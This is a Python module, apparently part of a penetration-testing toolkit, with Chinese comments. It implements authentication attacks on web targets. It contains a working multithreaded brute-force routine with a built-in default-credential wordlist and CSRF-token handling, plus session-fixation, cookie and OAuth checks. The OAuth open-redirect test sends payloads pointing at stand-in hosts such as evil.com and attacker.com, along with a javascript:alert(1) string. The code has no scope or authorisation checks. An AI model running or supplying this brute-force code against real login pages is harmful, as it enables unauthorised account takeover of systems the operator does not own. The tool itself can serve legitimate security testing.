# [file name]: attack_modules/auth_attacks.py

# !/usr/bin/env python3
"""
🔐 认证攻击模块 - 暴力破解、会话攻击、OAuth安全测试
"""

import requests
import re
import json
import time
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)


class AuthAttacker:
    """认证攻击模块"""

    def __init__(self, config: Dict):
        self.config = config.get('modules', {}).get('auth_attacks', {})
        self.timeout = config.get('scan', {}).get('timeout', 15)
        self.threads = self.config.get('brute_force', {}).get('threads', 5)
        self.max_attempts = self.config.get('brute_force', {}).get('max_attempts', 100)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # 加载凭证库
        self.credential_library = self.load_credential_library()

    def load_credential_library(self) -> Dict:
        """加载凭证库"""
        return {
            'usernames': [
                'admin', 'administrator', 'root', 'system', 'sysadmin',
                'user', 'test', 'guest', 'demo', 'manager', 'operator',
                'webmaster', 'support', 'info', 'service', 'admin123',
                'superuser', 'supervisor', 'backup', 'mysql', 'oracle',
                'postgres', 'dbadmin', 'ftp', 'mail', 'email', 'web',
                'www', 'http', 'https', 'api', 'mobile', 'app', 'application'
            ],
            'passwords': [
                'admin', 'password', '123456', 'admin123', '12345678',
                '123456789', '1234567890', 'qwerty', 'abc123', 'password1',
                'admin@123', 'admin123!', 'P@ssw0rd', 'Admin@123',
                '123123', '111111', '000000', '888888', '1234', '12345',
                'test', 'test123', 'guest', 'guest123', 'welcome', 'welcome123',
                'letmein', 'monkey', 'dragon', 'sunshine', 'master',
                'hello', 'freedom', 'whatever', 'qazwsx', 'password123',
                '123qwe', '1q2w3e4r', '1q2w3e', 'qwe123', 'passw0rd',
                'adminadmin', 'administrator', 'root123', 'toor', 'roottoor'
            ]
        }

    def brute_force_attack(self, target: str, login_info: Dict) -> List[Dict]:
        """暴力破解攻击"""
        results = []

        print("    🔐 执行暴力破解攻击...")

        # 获取登录表单信息
        form_info = self.analyze_login_form(login_info['url'])

        if not form_info:
            print("      无法分析登录表单")
            return results

        # 生成凭证组合
        credentials = self.generate_credentials(login_info.get('hints', {}))

        print(f"      测试 {len(credentials)} 个凭证组合...")

        found_creds = []
        tested = 0

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_cred = {}

            for username, password in credentials[:self.max_attempts]:
                future = executor.submit(
                    self.test_credential,
                    login_info['url'],
                    form_info,
                    username,
                    password
                )
                future_to_cred[future] = (username, password)

            for future in as_completed(future_to_cred):
                tested += 1

                # 显示进度
                if tested % 10 == 0:
                    print(f"      进度: {tested}/{min(len(credentials), self.max_attempts)}", end='\r')

                try:
                    result = future.result(timeout=self.timeout + 5)
                    if result.get('success'):
                        username, password = future_to_cred[future]
                        found_creds.append({
                            'username': username,
                            'password': password,
                            'evidence': result.get('evidence', [])
                        })
                        print(f"\n      🎉 发现凭证: {username}:{password}")

                        # 发现3个就停止
                        if len(found_creds) >= 3:
                            executor.shutdown(wait=False)
                            break

                except:
                    pass

            print(f"      进度: {tested}/{min(len(credentials), self.max_attempts)} 完成")

        if found_creds:
            results.append({
                'type': 'brute_force_success',
                'severity': 'high',
                'description': f'暴力破解成功，发现 {len(found_creds)} 组凭证',
                'credentials': found_creds,
                'login_url': login_info['url']
            })

        return results

    def analyze_login_form(self, url: str) -> Optional[Dict]:
        """分析登录表单"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            content = response.text

            form_info = {
                'url': url,
                'action': url,
                'method': 'POST',
                'username_field': 'username',
                'password_field': 'password',
                'csrf_present': False,
                'captcha_present': False,
                'extra_fields': {}
            }

            # 查找表单
            form_patterns = [
                r'<form[^>]*>(.*?)</form>',
                r'<form[^>]*/>'
            ]

            form_html = None
            for pattern in form_patterns:
                match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
                if match:
                    form_html = match.group(0)
                    break

            if not form_html:
                return None

            # 提取action
            action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form_html, re.I)
            if action_match:
                action = action_match.group(1).strip()
                if action:
                    if not action.startswith(('http://', 'https://', '//')):
                        action = urljoin(url, action)
                    form_info['action'] = action

            # 提取method
            method_match = re.search(r'method\s*=\s*["\']([^"\']+)["\']', form_html, re.I)
            if method_match:
                form_info['method'] = method_match.group(1).upper()

            # 查找所有输入字段
            input_tags = re.findall(r'<input[^>]*>', form_html, re.I)

            for tag in input_tags:
                name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
                if not name_match:
                    continue

                field_name = name_match.group(1)
                field_info = {'name': field_name}

                # 字段类型
                type_match = re.search(r'type\s*=\s*["\']([^"\']+)["\']', tag, re.I)
                field_info['type'] = type_match.group(1).lower() if type_match else 'text'

                # 值
                value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
                field_info['value'] = value_match.group(1) if value_match else ''

                # 识别关键字段
                tag_lower = tag.lower()
                field_lower = field_name.lower()

                if 'type="password"' in tag_lower:
                    form_info['password_field'] = field_name

                elif any(keyword in field_lower for keyword in ['user', 'name', 'login', 'account', 'email']):
                    if form_info['username_field'] == 'username':  # 只设置第一个匹配的
                        form_info['username_field'] = field_name

                elif any(keyword in field_lower for keyword in ['token', 'csrf', '_token', 'nonce']):
                    form_info['csrf_present'] = True
                    form_info['extra_fields'][field_name] = self.extract_csrf_token(content, field_name)

                elif any(keyword in field_lower for keyword in ['captcha', 'code', 'verify']):
                    form_info['captcha_present'] = True

                else:
                    # 其他字段
                    form_info['extra_fields'][field_name] = field_info['value']

            return form_info

        except Exception as e:
            logger.error(f"表单分析失败: {e}")
            return None

    def extract_csrf_token(self, html: str, field_name: str) -> Optional[str]:
        """提取CSRF token"""
        patterns = [
            rf'name=["\']{re.escape(field_name)}["\'][^>]*value=["\']([^"\']+)["\']',
            rf'value=["\']([^"\']+)["\'][^>]*name=["\']{re.escape(field_name)}["\']',
            rf'id=["\']{re.escape(field_name)}["\'][^>]*value=["\']([^"\']+)["\']'
        ]

        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1)

        return None

    def generate_credentials(self, hints: Dict) -> List[Tuple[str, str]]:
        """生成凭证组合"""
        credentials = []

        # 基于提示生成凭证
        if 'possible_usernames' in hints:
            usernames = hints['possible_usernames']
        else:
            usernames = self.credential_library['usernames']

        if 'possible_passwords' in hints:
            passwords = hints['possible_passwords']
        else:
            passwords = self.credential_library['passwords']

        # 生成所有组合
        for username in usernames[:20]:  # 限制用户名数量
            for password in passwords[:20]:  # 限制密码数量
                credentials.append((username, password))

        # 添加特殊组合
        special_combinations = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('administrator', 'admin'), ('root', 'root'), ('test', 'test'),
            ('guest', 'guest'), ('admin', 'admin123'), ('admin', 'P@ssw0rd')
        ]

        for combo in special_combinations:
            if combo not in credentials:
                credentials.append(combo)

        return credentials[:self.max_attempts]  # 限制总数

    def test_credential(self, url: str, form_info: Dict,
                        username: str, password: str) -> Dict:
        """测试单个凭证"""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Referer': url
            })

            # 获取页面（用于CSRF token）
            if form_info['csrf_present']:
                response = session.get(url, timeout=self.timeout, verify=False)
                # 更新CSRF token
                for field_name in form_info['extra_fields']:
                    if 'csrf' in field_name.lower() or 'token' in field_name.lower():
                        token = self.extract_csrf_token(response.text, field_name)
                        if token:
                            form_info['extra_fields'][field_name] = token

            # 准备数据
            data = {
                form_info['username_field']: username,
                form_info['password_field']: password
            }

            # 添加额外字段
            data.update(form_info['extra_fields'])

            # 提交登录
            if form_info['method'] == 'POST':
                login_response = session.post(
                    form_info['action'],
                    data=data,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:
                login_response = session.get(
                    form_info['action'],
                    params=data,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )

            # 判断是否成功
            success, evidence = self.check_login_success(login_response, username)

            return {
                'success': success,
                'evidence': evidence,
                'status_code': login_response.status_code,
                'final_url': login_response.url,
                'session_cookies': dict(session.cookies)
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def check_login_success(self, response, username: str) -> Tuple[bool, List[str]]:
        """检查登录是否成功"""
        evidence = []
        url_lower = response.url.lower()
        content_lower = response.text.lower()

        # 成功迹象
        success_indicators = [
            ('logout', '登出链接'),
            ('log out', '登出链接'),
            ('sign out', '登出链接'),
            ('welcome', '欢迎信息'),
            ('dashboard', '控制面板'),
            ('my account', '我的账户'),
            ('profile', '个人资料'),
            ('登录成功', '成功提示'),
            ('successfully', '成功登录'),
            ('authenticated', '已认证'),
            ('manage', '管理'),
            ('admin', '管理员')
        ]

        # 失败迹象
        failure_indicators = [
            ('invalid', '无效'),
            ('incorrect', '不正确'),
            ('wrong', '错误'),
            ('failed', '失败'),
            ('error', '错误'),
            ('try again', '重试'),
            ('login failed', '登录失败'),
            ('用户名或密码', '凭证错误'),
            ('password is wrong', '密码错误')
        ]

        # 检查成功
        for indicator, description in success_indicators:
            if indicator in content_lower or indicator in url_lower:
                evidence.append(description)
                return True, evidence

        # 检查失败
        for indicator, description in failure_indicators:
            if indicator in content_lower:
                evidence.append(description)
                return False, evidence

        # 其他判断方法

        # 1. URL变化
        if response.history:
            original_url = response.history[0].url.lower()
            final_url = response.url.lower()

            if 'login' in original_url and 'login' not in final_url:
                evidence.append('从登录页面重定向到其他页面')
                return True, evidence

        # 2. Cookie检查
        cookies = str(response.cookies).lower()
        session_cookies = ['session', 'auth', 'token', 'jwt', 'sess', 'sid']

        for cookie in session_cookies:
            if cookie in cookies:
                evidence.append(f'设置会话Cookie: {cookie}')
                return True, evidence

        # 3. 用户名出现
        if username.lower() in content_lower:
            evidence.append('用户名出现在页面中')
            return True, evidence

        return False, ['无法确定登录状态']

    def session_attack(self, target: str, login_info: Dict) -> List[Dict]:
        """会话攻击"""
        results = []

        print("    🔄 执行会话攻击...")

        # 1. 会话固定测试
        fixation_vulns = self.test_session_fixation(login_info['url'])
        results.extend(fixation_vulns)

        # 2. 会话劫持测试
        hijacking_vulns = self.test_session_hijacking(target)
        results.extend(hijacking_vulns)

        # 3. Cookie安全测试
        cookie_vulns = self.test_cookie_security(target)
        results.extend(cookie_vulns)

        return results

    def test_session_fixation(self, login_url: str) -> List[Dict]:
        """测试会话固定漏洞"""
        vulns = []

        print("      测试会话固定...")

        try:
            # 创建一个会话并获取初始Cookie
            session1 = requests.Session()
            response1 = session1.get(login_url, timeout=5, verify=False)

            initial_cookies = dict(session1.cookies)

            if initial_cookies:
                # 使用相同的Cookie创建新会话
                session2 = requests.Session()
                for cookie_name, cookie_value in initial_cookies.items():
                    session2.cookies.set(cookie_name, cookie_value)

                # 尝试用第二个会话登录
                form_info = self.analyze_login_form(login_url)

                if form_info:
                    # 使用默认凭证测试
                    test_data = {
                        form_info['username_field']: 'test',
                        form_info['password_field']: 'test'
                    }

                    # 添加额外字段
                    for field_name, field_value in form_info['extra_fields'].items():
                        test_data[field_name] = field_value

                    login_response = session2.post(
                        form_info['action'],
                        data=test_data,
                        timeout=5,
                        verify=False
                    )

                    # 检查登录后Cookie是否相同
                    if session2.cookies == session1.cookies:
                        vulns.append({
                            'type': 'session_fixation',
                            'severity': 'medium',
                            'description': '可能存在会话固定漏洞',
                            'login_url': login_url,
                            'evidence': '登录前后会话ID未改变'
                        })

        except:
            pass

        return vulns

    def test_session_hijacking(self, target: str) -> List[Dict]:
        """测试会话劫持漏洞"""
        vulns = []

        print("      测试会话劫持...")

        # 检查Cookie安全属性
        try:
            response = self.session.get(target, timeout=5, verify=False)
            cookies = response.cookies

            for cookie in cookies:
                cookie_dict = cookie.__dict__

                security_issues = []

                # 检查Secure标志
                if not cookie_dict.get('secure', False):
                    security_issues.append('缺少Secure标志')

                # 检查HttpOnly标志
                if not cookie_dict.get('has_nonstandard_attr', {}).get('HttpOnly', False):
                    # 简单检查
                    if 'httponly' not in str(cookie).lower():
                        security_issues.append('缺少HttpOnly标志')

                # 检查SameSite
                if 'samesite' not in str(cookie).lower():
                    security_issues.append('缺少SameSite属性')

                if security_issues:
                    vulns.append({
                        'type': 'cookie_security_issue',
                        'severity': 'medium',
                        'description': f'Cookie安全配置问题: {cookie.name}',
                        'cookie_name': cookie.name,
                        'issues': security_issues
                    })

        except:
            pass

        # 检查会话ID可预测性
        try:
            session_ids = []

            for i in range(5):
                session = requests.Session()
                response = session.get(target, timeout=3, verify=False)

                # 收集会话ID
                for cookie in session.cookies:
                    if 'session' in cookie.name.lower() or 'sess' in cookie.name.lower():
                        session_ids.append(cookie.value)
                        break

            # 检查会话ID是否可预测
            if len(session_ids) >= 3:
                # 简单检查：是否相似
                if all(sid[:10] == session_ids[0][:10] for sid in session_ids):
                    vulns.append({
                        'type': 'predictable_session_id',
                        'severity': 'medium',
                        'description': '会话ID可能可预测',
                        'evidence': f'收集的会话ID: {session_ids[:3]}'
                    })

        except:
            pass

        return vulns

    def test_cookie_security(self, target: str) -> List[Dict]:
        """测试Cookie安全性"""
        vulns = []

        try:
            response = self.session.get(target, timeout=5, verify=False)
            set_cookie_header = response.headers.get('Set-Cookie', '')

            # 检查敏感信息在Cookie中
            sensitive_in_cookie = False
            sensitive_keywords = ['user', 'pass', 'admin', 'role', 'privilege']

            for keyword in sensitive_keywords:
                if keyword in set_cookie_header.lower():
                    sensitive_in_cookie = True
                    break

            if sensitive_in_cookie:
                vulns.append({
                    'type': 'sensitive_data_in_cookie',
                    'severity': 'medium',
                    'description': 'Cookie中包含敏感信息',
                    'set_cookie_header': set_cookie_header[:100]
                })

            # 检查Cookie范围
            if 'Domain=' not in set_cookie_header:
                vulns.append({
                    'type': 'cookie_domain_missing',
                    'severity': 'low',
                    'description': 'Cookie未设置Domain属性',
                    'set_cookie_header': set_cookie_header[:100]
                })

            # 检查过期时间
            if 'Expires=' not in set_cookie_header and 'Max-Age=' not in set_cookie_header:
                vulns.append({
                    'type': 'cookie_no_expiration',
                    'severity': 'low',
                    'description': 'Cookie未设置过期时间',
                    'set_cookie_header': set_cookie_header[:100]
                })

        except:
            pass

        return vulns

    def oauth_attack(self, target: str) -> List[Dict]:
        """OAuth安全测试"""
        results = []

        print("    🔑 执行OAuth安全测试...")

        # 1. 查找OAuth端点
        oauth_endpoints = self.find_oauth_endpoints(target)

        if not oauth_endpoints:
            print("      未发现OAuth端点")
            return results

        for endpoint in oauth_endpoints:
            endpoint_type = endpoint['type']
            endpoint_url = endpoint['url']

            print(f"      测试OAuth端点: {endpoint_type} - {endpoint_url}")

            # 2. 配置错误测试
            config_vulns = self.test_oauth_configuration(endpoint_url, endpoint_type)
            results.extend(config_vulns)

            # 3. Token泄露测试
            token_vulns = self.test_oauth_token_security(endpoint_url, endpoint_type)
            results.extend(token_vulns)

        return results

    def find_oauth_endpoints(self, target: str) -> List[Dict]:
        """查找OAuth端点"""
        endpoints = []

        common_oauth_paths = [
            '/oauth/authorize',
            '/oauth/token',
            '/oauth/callback',
            '/oauth/authenticate',
            '/auth/oauth',
            '/connect/authorize',
            '/connect/token',
            '/api/oauth',
            '/login/oauth',
            '/.well-known/oauth-authorization-server'
        ]

        for path in common_oauth_paths:
            oauth_url = urljoin(target, path)

            try:
                response = self.session.get(oauth_url, timeout=5, verify=False)

                if response.status_code in [200, 400, 401]:
                    # 检查是否为OAuth端点
                    content = response.text.lower()

                    if any(keyword in content for keyword in ['oauth', 'authorize', 'token', 'client_id']):
                        endpoint_type = 'oauth'
                        if 'authorize' in path:
                            endpoint_type = 'oauth_authorize'
                        elif 'token' in path:
                            endpoint_type = 'oauth_token'

                        endpoints.append({
                            'url': response.url,
                            'type': endpoint_type,
                            'status': response.status_code
                        })

            except:
                continue

        # 检查页面中的OAuth链接
        try:
            response = self.session.get(target, timeout=5, verify=False)
            content = response.text

            # 查找OAuth相关链接
            oauth_patterns = [
                r'href=["\'][^"\']*oauth[^"\']*["\']',
                r'src=["\'][^"\']*oauth[^"\']*["\']',
                r'action=["\'][^"\']*oauth[^"\']*["\']'
            ]

            for pattern in oauth_patterns:
                matches = re.findall(pattern, content, re.I)

                for match in matches:
                    # 提取URL
                    url_match = re.search(r'["\']([^"\']+)["\']', match)
                    if url_match:
                        oauth_url = url_match.group(1)

                        if not oauth_url.startswith(('http://', 'https://')):
                            oauth_url = urljoin(target, oauth_url)

                        # 去重
                        if not any(e['url'] == oauth_url for e in endpoints):
                            endpoints.append({
                                'url': oauth_url,
                                'type': 'oauth_link',
                                'status': 'unknown'
                            })

        except:
            pass

        return endpoints

    def test_oauth_configuration(self, oauth_url: str, endpoint_type: str) -> List[Dict]:
        """测试OAuth配置错误"""
        vulns = []

        try:
            # 测试开放重定向
            if endpoint_type == 'oauth_authorize':
                redirect_test = self.test_oauth_open_redirect(oauth_url)
                if redirect_test:
                    vulns.append(redirect_test)

            # 测试缺少状态参数
            state_test = self.test_oauth_state_parameter(oauth_url)
            if state_test:
                vulns.append(state_test)

            # 测试响应类型
            response_type_test = self.test_oauth_response_type(oauth_url)
            if response_type_test:
                vulns.append(response_type_test)

        except:
            pass

        return vulns

    def test_oauth_open_redirect(self, oauth_url: str) -> Optional[Dict]:
        """测试OAuth开放重定向"""
        test_redirects = [
            'http://evil.com',
            'https://attacker.com/callback',
            '//evil.com',
            'javascript:alert(1)'
        ]

        for redirect_url in test_redirects:
            test_url = f"{oauth_url}?redirect_uri={redirect_url}&response_type=code&client_id=test"

            try:
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')

                    if redirect_url in location or 'evil.com' in location:
                        return {
                            'type': 'oauth_open_redirect',
                            'severity': 'medium',
                            'description': 'OAuth存在开放重定向漏洞',
                            'url': oauth_url,
                            'redirect_url': redirect_url,
                            'location_header': location[:100]
                        }

            except:
                continue

        return None

    def test_oauth_state_parameter(self, oauth_url: str) -> Optional[Dict]:
        """测试OAuth state参数"""
        # 测试不带state参数
        test_url = f"{oauth_url}?response_type=code&client_id=test&redirect_uri=http://localhost"

        try:
            response = self.session.get(test_url, timeout=5, verify=False)

            if response.status_code == 200:
                # 检查返回的URL中是否有state参数
                content = response.text

                # 查找授权码
                code_match = re.search(r'code=([^&\s]+)', content)

                if code_match and 'state=' not in content.lower():
                    return {
                        'type': 'oauth_missing_state',
                        'severity': 'medium',
                        'description': 'OAuth缺少state参数，可能存在CSRF漏洞',
                        'url': oauth_url,
                        'evidence': '发现授权码但未使用state参数'
                    }

        except:
            pass

        return None

    def test_oauth_response_type(self, oauth_url: str) -> Optional[Dict]:
        """测试OAuth响应类型"""
        dangerous_response_types = ['token', 'id_token token']

        for response_type in dangerous_response_types:
            test_url = f"{oauth_url}?response_type={response_type}&client_id=test"

            try:
                response = self.session.get(test_url, timeout=5, verify=False)

                if response.status_code == 200:
                    return {
                        'type': 'oauth_dangerous_response_type',
                        'severity': 'medium',
                        'description': f'OAuth使用危险的response_type: {response_type}',
                        'url': oauth_url,
                        'response_type': response_type
                    }

            except:
                continue

        return None

    def test_oauth_token_security(self, oauth_url: str, endpoint_type: str) -> List[Dict]:
        """测试OAuth Token安全性"""
        vulns = []

        if endpoint_type != 'oauth_token':
            return vulns

        # 测试Token在URL中传递
        test_url = f"{oauth_url}#access_token=test123"

        try:
            response = self.session.get(test_url, timeout=5, verify=False)

            if response.status_code == 200:
                vulns.append({
                    'type': 'oauth_token_in_fragment',
                    'severity': 'low',
                    'description': 'OAuth Token在URL片段中传递',
                    'url': oauth_url
                })

        except:
            pass

        return vulns

    def execute_attack(self, target: str, attack_type: str = 'all',
                       login_info: Dict = None) -> List[Dict]:
        """执行认证攻击"""
        results = []

        if attack_type in ['all', 'brute_force']:
            if login_info:
                brute_results = self.brute_force_attack(target, login_info)
                results.extend(brute_results)

        if attack_type in ['all', 'session']:
            if login_info:
                session_results = self.session_attack(target, login_info)
                results.extend(session_results)

        if attack_type in ['all', 'oauth']:
            oauth_results = self.oauth_attack(target)
            results.extend(oauth_results)

        return results


# 测试函数
def test_auth_attacker():
    """测试认证攻击模块"""
    print("=" * 60)
    print("🧪 认证攻击模块测试")
    print("=" * 60)

    config = {
        'modules': {
            'auth_attacks': {
                'brute_force': {
                    'enabled': True,
                    'threads': 3,
                    'max_attempts': 50
                },
                'session_attacks': {'enabled': True},
                'oauth_attacks': {'enabled': True}
            }
        },
        'scan': {'timeout': 10}
    }

    attacker = AuthAttacker(config)

    # 测试凭证生成
    credentials = attacker.generate_credentials({})
    print(f"生成 {len(credentials)} 个测试凭证")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    test_auth_attacker()
